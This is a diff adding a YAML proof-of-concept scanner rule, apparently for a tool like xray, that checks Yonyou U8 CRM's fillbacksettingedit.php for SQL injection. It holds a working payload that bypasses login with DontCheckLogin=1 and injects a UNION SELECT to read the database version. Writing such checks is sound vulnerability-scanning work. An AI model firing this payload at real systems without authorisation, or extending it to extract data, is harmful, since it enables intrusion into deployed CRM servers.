@@ -1,0 +1,18 @@
+name: poc-yaml-yongyouU8-CRM-fillbacksettingedit.php-sql
+transport: http
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /config/fillbacksettingedit.php?DontCheckLogin=1&action=edit&id=1+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,@@VERSION,NULL,NULL--+
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        Cookie: PHPSESSID=bgsesstimeout-;
+    expression: response.status == 200 && response.body.bcontains(b'Microsoft SQL')
+expression: r0()
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487886&idx=1&sn=e4b869bedbf92b469db05f5e12665a77&chksm=c267a4bdf5102dabcd3143b32fef256da5eba7af1355708e5bca3385ee8d9990a20f25c230d6&token=129725642&lang=zh_CN#rd
